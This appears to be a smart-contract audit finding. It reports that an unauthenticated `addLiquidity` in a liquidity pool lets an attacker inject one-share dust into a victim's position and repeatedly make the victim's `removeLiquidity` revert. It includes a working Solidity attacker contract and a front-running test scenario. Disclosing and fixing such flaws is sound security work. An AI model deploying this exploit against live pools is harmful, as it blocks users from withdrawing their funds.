### Title
Unrestricted `addLiquidity` Allows Anyone to Persistently Block Victim's `removeLiquidity` via `MinimalLiquidity` Dust Injection — (File: `metric-core/contracts/MetricOmmPool.sol`)

---

### Summary

`MetricOmmPool.addLiquidity` accepts an arbitrary `owner` address with no authentication check. Any caller can deposit a single share into a victim's existing position. Because `removeLiquidity` enforces a `MinimalLiquidity` floor on the *remaining* share balance, an attacker can front-run every "remove-all" transaction the victim submits, leaving a 1-share dust residual that causes the removal to revert. The attack costs the attacker only the token value of one share (potentially 1 wei) per front-run and can be repeated indefinitely.

---

### Finding Description

**Unrestricted `owner` in `addLiquidity`**

`MetricOmmPool.addLiquidity` is documented as an "operator pattern": `msg.sender` pays but `owner` may be any address. [1](#0-0) 

There is no check that `msg.sender == owner` or that `msg.sender` is an approved operator for `owner`. The periphery's `_validateOwner` only rejects `address(0)`. [2](#0-1) 

**`MinimalLiquidity` guard on `removeLiquidity`**

`LiquidityLib.removeLiquidity` enforces that any *non-zero* residual share balance must be at least `MINIMAL_MINTABLE_LIQUIDITY`: [3](#0-2) 

Removing to exactly zero is allowed; leaving 1–999 shares (when `MINIMAL_MINTABLE_LIQUIDITY = 1000`, as in the test fixture) is not.

**`MinimalLiquidity` guard on `addLiquidity`**

Adding to an *existing* position (where `userShares >= MINIMAL_MINTABLE_LIQUIDITY`) passes the add-side check for any `sharesToAdd >= 1`: [4](#0-3) 

**Attack chain**

1. Victim holds `N` shares in bin `B` (`N >= MINIMAL_MINTABLE_LIQUIDITY`).
2. Victim broadcasts `removeLiquidity(victim, salt, [B], [N])` to exit the position completely.
3. Attacker front-runs with `pool.addLiquidity(victim, salt, [B], [1], callbackData, "")`, paying the token cost of 1 share (as little as 1 wei of scaled token).
4. Victim's removal now computes `newUserShares = (N+1) - N = 1`. Since `1 > 0` and `1 < MINIMAL_MINTABLE_LIQUIDITY`, the call reverts with `MinimalLiquidity(1, 1000)`.
5. Victim resubmits with `N+1` shares; attacker front-runs again with 1 more share. The cycle repeats indefinitely.

The token cost per front-run is: [5](#0-4) 

`ceil(binState.token0BalanceScaled * 1 / binTotalSharesVal)` — which rounds to 1 scaled unit (≥ 1 wei of external token) when the bin is large and shares are many.

---

### Impact Explanation

The victim's `removeLiquidity` withdraw flow is persistently broken. Every attempt to exit a position can be reverted at negligible cost to the attacker. The victim's principal is not permanently destroyed — they can recover by atomically reading their current share count and removing exactly that many in a single contract call — but the standard EOA withdraw path is rendered unusable under active griefing. This meets the "broken core pool functionality / unusable withdraw flows" impact class.

---

### Likelihood Explanation

- **Trigger**: any unprivileged EOA or contract; no special role required.
- **Cost**: 1 wei of token0 or token1 per front-run (proportional to `binBalance / totalShares`, which approaches 1 scaled unit for large bins).
- **Detectability**: the attacker only needs to watch the mempool for `removeLiquidity` calls targeting a specific `(owner, salt, bin)` key.
- **Persistence**: the attack can be repeated every block with no cooldown.

Likelihood is **High**.

---

### Recommendation

1. **Require caller authorization for third-party adds.** Introduce an operator-approval mapping (similar to ERC-6909 or Uniswap v4's `isOperator`) so that `addLiquidity` with `owner != msg.sender` requires `approvedOperator[owner][msg.sender] == true`. This mirrors the `vestFor` fix of whitelisting callers.

2. **Alternatively, gate via `DEPOSIT_ALLOWLIST_PROVIDER`.** The extension hook already exists; pools that need the operator pattern should deploy an allowlist extension that restricts which `(sender, owner)` pairs are permitted.

3. **Harden `removeLiquidity` against dust injection.** Consider allowing removal of *all* shares regardless of the `MinimalLiquidity` floor (the floor already permits `newUserShares == 0`), and only enforce the floor when the residual is strictly between 0 and the minimum. This is already the case — the real fix is on the `addLiquidity` auth side.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IMetricOmmModifyLiquidityCallback} from
    "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";

/// @notice Attacker contract: adds 1 share to victim's position, paying from its own balance.
contract DustInjector is IMetricOmmModifyLiquidityCallback {
    address immutable pool;
    address immutable token0;
    address immutable token1;

    constructor(address _pool, address _token0, address _token1) {
        pool = _pool;
        token0 = _token0;
        token1 = _token1;
    }

    /// @notice Front-run victim's removeLiquidity by injecting 1 share into their position.
    function inject(address victim, uint80 salt, int256 bin) external {
        int256[] memory bins = new int256[](1);
        bins[0] = bin;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 1; // 1 share — passes MinimalLiquidity check because victim already has N shares

        LiquidityDelta memory delta = LiquidityDelta({binIdxs: bins, shares: shares});
        // No auth check: owner = victim, msg.sender = attacker
        IMetricOmmPoolActions(pool).addLiquidity(victim, salt, delta, "", "");
    }

    /// @notice Pool callback: pay the tiny token cost (≥ 1 wei).
    function metricOmmModifyLiquidityCallback(uint256 amount0, uint256 amount1, bytes calldata)
        external
        override
    {
        require(msg.sender == pool);
        if (amount0 > 0) IERC20(token0).transfer(pool, amount0);
        if (amount1 > 0) IERC20(token1).transfer(pool, amount1);
    }
}

// Test scenario (Foundry):
//
// 1. victim adds N = 10_000 shares to bin 4 (N >= MINIMAL_MINTABLE_LIQUIDITY = 1000).
// 2. victim submits removeLiquidity(victim, salt, [4], [10_000]).
// 3. attacker front-runs: DustInjector.inject(victim, salt, 4) → victim now has 10_001 shares.
// 4. victim's removeLiquidity(10_000) → newUserShares = 1 → MinimalLiquidity(1, 1000) → REVERT.
// 5. Repeat indefinitely at ~1 wei cost per block.
```

**Relevant state transitions:**

| Step | `positionBinShares[victim][salt][4]` | `removeLiquidity(10_000)` result |
|------|--------------------------------------|----------------------------------|
| After victim add | 10_000 | would succeed (remaining = 0) |
| After attacker inject | 10_001 | **REVERTS** `MinimalLiquidity(1, 1000)` |
| After second inject | 10_002 | **REVERTS** `MinimalLiquidity(2, 1000)` |

The victim's only escape is an atomic read-then-remove in a single contract call, which is not the standard EOA flow and requires knowing the attack is occurring. [1](#0-0) [6](#0-5) [4](#0-3) [3](#0-2)
